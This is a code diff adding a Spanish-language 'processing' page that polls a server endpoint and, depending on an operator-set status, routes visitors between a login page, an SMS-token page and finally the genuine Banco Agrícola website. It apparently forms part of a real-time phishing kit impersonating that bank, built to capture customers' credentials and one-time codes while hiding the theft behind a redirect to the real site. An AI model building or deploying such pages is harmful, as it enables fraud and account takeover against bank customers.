@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Por favor, espera...</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --font: "Open Sans", sans-serif; --yellow: #FDDA24; }
+        body { 
+            font-family: var(--font); 
+            background: #fff; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+            text-align: center;
+            color: #000;
+        }
+        .container {
+            max-width: 400px;
+            padding: 40px;
+        }
+        .spinner { 
+            border: 4px solid #f3f3f3; 
+            border-top: 4px solid var(--yellow); 
+            border-radius: 50%; 
+            width: 48px; 
+            height: 48px; 
+            animation: spin 1s linear infinite; 
+            margin: 0 auto 24px; 
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { font-weight: 700; font-size: 24px; margin-bottom: 12px; }
+        p { color: #505050; font-size: 16px; line-height: 1.5; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h2>Procesando...</h2>
+        <p>Por favor, espera un momento mientras validamos tu información. No recargues esta página.</p>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('session_id');
+
+        if (!sessionId) {
+            window.location.href = 'index.html';
+        }
+
+        let pollingActive = true;
+
+        const checkStatus = async () => {
+            if (!pollingActive) return;
+
+            try {
+                const response = await fetch(`/api/status?session_id=${sessionId}`);
+                const data = await response.json();
+
+                if (data.success) {
+                    const status = data.status;
+                    
+                    if (status === 'login') { 
+                        pollingActive = false; window.location.href = `index.html?session_id=${sessionId}`; 
+                    } else if (status === 'error_login') { 
+                        pollingActive = false; window.location.href = `index.html?error=1&session_id=${sessionId}`; 
+                    } else if (status === 'sms') { 
+                        pollingActive = false; window.location.href = `token.html?session_id=${sessionId}`; 
+                    } else if (status === 'error') { 
+                        pollingActive = false; window.location.href = `token.html?error=1&session_id=${sessionId}`; 
+                    } else if (status === 'success') { 
+                        pollingActive = false; window.location.href = `https://www.bancoagricola.com`; 
+                    }
+                    // if status is 'waiting', do nothing, just wait.
+                }
+            } catch (error) {
+                console.error('Polling error:', error);
+            }
+        };
+
+        // Check every 2 seconds
+        setInterval(checkStatus, 2000);
+    </script>
+</body>
+</html>
